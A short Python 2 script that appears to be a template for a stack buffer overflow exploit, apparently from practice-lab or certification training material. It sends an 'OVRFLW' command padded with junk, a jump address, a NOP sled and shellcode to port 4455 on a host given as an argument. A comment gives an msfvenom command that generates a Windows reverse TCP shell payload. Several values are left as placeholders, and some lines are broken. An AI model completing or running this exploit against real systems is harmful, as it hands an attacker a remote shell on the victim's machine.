#!/usr/bin/python

import sys, socket

# msfvenom -p windows/shell_reverse_tcp lhost= lport=1337 -f c -b "<badchars>"


reminder = raw_input ("Check commented code for msfvenom shellcode command and insert in shell variable")


if len(sys.argv) < 2:
    print "\nUsage: " +sys.argv[0] + " <HOST>\n"
    sys.exit()

#Badchar list (add to here as we find them)
# \x00\

jmp = " "

#paste shellcode between the brackets
shell = ()

cmd = "OVRFLW "
junk = "A" * <offset> + jmp + '\x90' * 20 + shell
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close

